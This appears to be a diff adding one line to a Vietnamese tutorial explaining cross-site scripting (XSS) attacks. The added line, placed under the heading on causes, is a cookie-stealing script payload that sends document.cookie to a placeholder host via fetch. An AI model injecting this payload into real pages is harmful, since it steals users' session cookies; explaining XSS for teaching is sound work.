@@ -30,3 +30,4 @@ Tuy nhiên, thường xuyên nhất cuộc tấn công này được thực hi�
 Tấn công XSS là gửi và chèn script độc hại, những mã độc này được viết bằng các ngôn ngữ ở client như Javascript, HTML, CSS VBScript,... Tuy nhiên phổ biến nhất là Javascript và HTML. Có rất nhiều các thức để thực hiện cuộc tấn công này, phụ thuộc vào nhiều trường hợp khác nhau.
 
 a. Nguyên nhân
+<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>
